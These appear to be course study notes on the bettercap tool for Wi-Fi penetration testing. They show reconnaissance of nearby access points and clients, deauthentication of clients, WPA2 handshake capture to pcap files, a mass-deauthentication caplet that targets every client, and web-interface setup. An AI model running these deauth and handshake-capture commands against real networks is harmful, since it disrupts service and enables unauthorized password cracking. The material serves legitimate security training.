---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 13: bettercap Essentials

## Installation and Executing

Installing bettercap:

```bash
kali@kali:~$ sudo apt install bettercap
```

Starting bettercap:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo bettercap -iface wlan0
bettercap v2.28 (built for linux amd64 with go1.14.4) [type 'help' for a list of commands]

 wlan0  » help

           help MODULE : List available commands or show module specific help if no module name is provided.
                active : Show information about active modules.
                  quit : Close the session and exit.
         sleep SECONDS : Sleep for the given amount of seconds.
              get NAME : Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.
        set NAME VALUE : Set the VALUE of variable NAME.
  read VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.
                 clear : Clear the screen.
        include CAPLET : Load and run this caplet in the current session.
             ! COMMAND : Execute a shell command and print its output.
        alias MAC NAME : Assign an alias to a given endpoint given its MAC address.

Modules

      any.proxy > not running
       api.rest > not running
      arp.spoof > not running
      ble.recon > not running
        caplets > not running
    dhcp6.spoof > not running
      dns.spoof > not running
  events.stream > running
            gps > not running
...
```
{% endcode %}

We can change the specified interface with `set wifi.interface wlanX` in the interactive terminal. If this is done, the terminal will not update to show the new interface being used however it will have changed.

## Modules vs. Commands



## Wi-Fi Module

### Discovering APs

Starting the Wi-Fi module to begin discovering:

{% code overflow="wrap" %}
```bash
wlan0  » wifi.recon on
[11:47:50] [sys.log] [inf] wifi using interface wlan0 (16:e4:c1:8f:25:32)
[11:47:50] [sys.log] [war] wifi could not set interface wlan0 txpower to 30, 'Set Tx Power' requests not supported
[11:47:51] [sys.log] [inf] wifi started (min rssi: -200 dBm)
wlan0  » [11:47:51] [sys.log] [inf] wifi channel hopper started.
wlan0  » [11:47:51] [wifi.ap.new] wifi access point dot11 (-51 dBm) detected as d4:9f:e2:2d:d1:24.
wlan0  » [11:47:51] [wifi.ap.new] wifi access point Corporate(-51 dBm) detected as c6:2d:56:2a:53:f8.
wlan0  » [11:47:51] [wifi.ap.new] wifi access point WuTangLan (-50 dBm) detected as 38:06:5e:11:f0:88.
wlan0  » [11:47:51] [wifi.client.new] new station c0:ee:fb:1a:d8:8d detected for Corporate (c6:2d:56:2a:53:f8)
wlan0  » [11:47:51] [wifi.client.new] new station 89:3c:3a:a7:c7:6a detected for WuTangLan (b6:fb:e4:44:45:b6)
wlan0  » [11:47:51] [wifi.client.new] new station c7:b5:66:4d:c1:d2 detected for WuTangLan (b6:fb:e4:44:45:b6)
wlan0  » [11:47:53] [wifi.client.probe] station ac:22:0b:28:fd:22 is probing for SSID Corporate (-63 dBm)
wlan0  » [11:47:53] [wifi.client.probe] station ac:22:0b:28:fd:22 is probing for SSID Corporate (-62 dBm)
wlan0  » [11:47:54] [wifi.ap.new] wifi access point guest (-50 dBm) detected as 0a:86:3b:98:96:e8.
...
```
{% endcode %}

Setting the channels to only 6 and 11:

```bash
wlan0  » wifi.recon.channel 6,11
```

Running the **show** command to list discovered wireless stations:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Using the **ticker** module to periodically execute multiple commands:

{% code overflow="wrap" %}
```bash
wlan0  » set ticker.commands "clear; wifi.show"

wlan0  » wifi.recon on
...
wlan0  » ticker on
```
{% endcode %}

{% hint style="info" %}
We can also execute commands upon starting bettercap:&#x20;

{% code overflow="wrap" %}
```
sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
```
{% endcode %}
{% endhint %}

We can stop the execution of ticker via `ticker off`.

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Sorting by Number of Clients</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>Filtering by WPA2 Encryption</p></figcaption></figure>

Listing clients by BSSID:

{% code overflow="wrap" %}
```bash
wlan0  » wifi.recon c6:2d:56:2a:53:f8

wlan0  » wifi.show

c6:2d:56:2a:53:f8 clients:

┌─────────┬───────────────────┬────┬────────┬───────┬──────────┐
│ RSSI ▴  │       BSSID       │ Ch │  Sent  │ Recvd │   Seen   │
├─────────┼───────────────────┼────┼────────┼───────┼──────────┤
│ -41 dBm │ c0:ee:fb:1a:d8:8d │ 6  │ 355 B  │       │ 11:50:21 │
│ -46 dBm │ ac:22:0b:28:fd:22 │ 6  │ 1.3 kB │       │ 11:50:24 │
│ -50 dBm │ 78:fd:94:b5:ec:88 │ 6  │ 5.1 kB │       │ 11:50:23 │
└─────────┴───────────────────┴────┴────────┴───────┴──────────┘

wlan0 (ch. 6) / ↑ 0 B / ↓ 328 kB / 2147 pkts
```
{% endcode %}

Filtering with regex:

{% code overflow="wrap" %}
```bash
wlan0  » set wifi.show.filter ^c0

wlan0  » wifi.show

c6:2d:56:2a:53:f8 clients:

┌─────────┬───────────────────┬────┬────────┬───────┬──────────┐
│ RSSI ▴  │       BSSID       │ Ch │  Sent  │ Recvd │   Seen   │
├─────────┼───────────────────┼────┼────────┼───────┼──────────┤
│ -41 dBm │ c0:ee:fb:1a:d8:8d │ 6  │ 253 kB │       │ 11:50:43 │
└─────────┴───────────────────┴────┴────────┴───────┴──────────┘

wlan0 (ch. 6) / ↑ 0 B / ↓ 4 MB / 5147 pkts
```
{% endcode %}

### Deauthenticating a Client

Deauthenticating all clients connected to a specific BSSID:

{% code overflow="wrap" %}
```bash
wlan0  » wifi.deauth c6:2d:56:2a:53:f8
wlan0  » [17:07:22] [sys.log] [inf] wifi deauthing client c0:ee:fb:1a:d8:8d (OnePlus Tech (Shenzhen) Ltd) from AP Corporate (channel:6 encryption:WPA2)
wlan0  » [17:07:24] [sys.log] [inf] wifi deauthing client ac:22:0b:28:fd:22 (ASUSTek COMPUTER INC.) from AP Corporate (channel:6 encryption:WPA2)
wlan0  » [17:07:26] [sys.log] [inf] wifi deauthing client 78:fd:94:b5:ec:88 (Apple, Inc.) from AP Corporate (channel:6 encryption:WPA2)
```
{% endcode %}

Deauthenticating a single client:

```bash
wlan0  » wifi.deauth ac:22:0b:28:fd:22
wlan0  » [17:07:33] [sys.log] [inf] wifi deauthing client ac:22:0b:28:fd:22 (ASUSTek COMPUTER INC.) from AP Corporate (channel:6 encryption:WPA2)
 ...
wlan0  » [17:07:47] [wifi.client.handshake] captured ac:22:0b:28:fd:22 -> Corporate (c6:2d:56:2a:53:f8) WPA2 handshake (full) to /root/bettercap-wifi-handshakes.pcap
...
```

Changing the File and Aggregate settings:

{% code overflow="wrap" %}
```bash
 wlan1  » wifi.recon off

 wlan1  » get wifi.handshakes.file 

  wifi.handshakes.file: '~/bettercap-wifi-handshakes.pcap'

 wlan0  » set wifi.handshakes.file "/home/kali/handshakes/"

 wlan0  » set wifi.handshakes.aggregate false

 wlan0  » wifi.recon on

 wlan0  » wifi.deauth c6:2d:56:2a:53:f8
 ...
 wlan0  » [16:28:12] [wifi.client.handshake] captured 78:fd:94:b5:ec:88 -> Corporate (c6:2d:56:2a:53:f8) WPA2 handshake (full) to /home/kali/handshakes/Corporate_405d82dcb210.pcap
```
{% endcode %}

## Additional Methods of Interacting with Bettercap

### Caplets

_Caplets are files that allow us to quickly run a series of commands without having to manually type each one into the interactive terminal._ _They have a **.cap** file extension._

The example caplets can be found in **/usr/share/bettercap/caplets/**.

Caplet for mass deauthentication:

{% code overflow="wrap" %}
```bash
kali@kali:~$ cd /usr/share/bettercap/caplets/

kali@kali:/usr/share/bettercap/caplets$ cat -n massdeauth.cap
 1  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
 2
 3  # every 10 seconds deauth every client from every ap
 4  set ticker.period 10
 5  set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff
 6
 7  # uncomment to only hop on these channels:
 8  # wifi.recon.channel 1,2,3
 9
10  wifi.recon on
11  ticker on
12  events.clear
13  clear
```
{% endcode %}

Running a custom caplet:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo bettercap -iface wlan0 -caplet deauth_corp.cap
```
{% endcode %}

### Web Interface

Configuring nftables on the kali machine running bettercap:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo nft add table inet filter

kali@kali:~$ sudo nft add chain inet filter INPUT { type filter hook input priority 0\; policy drop\; }

kali@kali:~$ sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 443 accept

kali@kali:~$ sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 8083 accept
```
{% endcode %}

Editing **/usr/share/bettercap/caplets/https-ui.cap** to set a username and password:

{% code overflow="wrap" %}
```bash
kali@kali:~$ cat -n /usr/share/bettercap/caplets/https-ui.cap
 1	# api listening on https://0.0.0.0:8083/ and ui on https://0.0.0.0
 2	set api.rest.address 0.0.0.0
 3	set api.rest.port 8083
 4	set https.server.address 0.0.0.0
 5	set https.server.port 443
 6
 7	# make sure both use the same https certificate so api requests won't fail
 8	set https.server.certificate ~/.bettercap-https.cert.pem
 9	set https.server.key ~/.bettercap-https.key.pem
10	set api.rest.certificate ~/.bettercap-https.cert.pem
11	set api.rest.key ~/.bettercap-https.key.pem
12	# default installation path of the ui
13	set https.server.path /usr/share/bettercap/ui
14
15	# !!! CHANGE THESE !!!
16	set api.rest.username offsec
17	set api.rest.password wifu
18
19	# go!
20	api.rest on
21	https.server on
```
{% endcode %}

{% hint style="info" %}
If we wanted to only run bettercap locally, we would use the http-ui caplet instead of the https-ui caplet. The http-ui caplet starts the HTTP listener on the loopback interface instead of on all interfaces.
{% endhint %}

{% hint style="warning" %}
The HTML and JavaScript loaded on the login page will instruct our browser to make calls to the API server running on port 8083. Because we use a self-signed certificate, and web browsers don't trust them by default, we will need to accept the certificate first. If we don't do this, the API calls will fail.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption><p>Accepting the Certificate of the API Server</p></figcaption></figure>

Navigating to the _Advanced_tab allows us to inspect our settings, commands, and other information. Scrolling down to the Wi-Fi settings, we can find all the commands and parameters available for the Wi-Fi module.
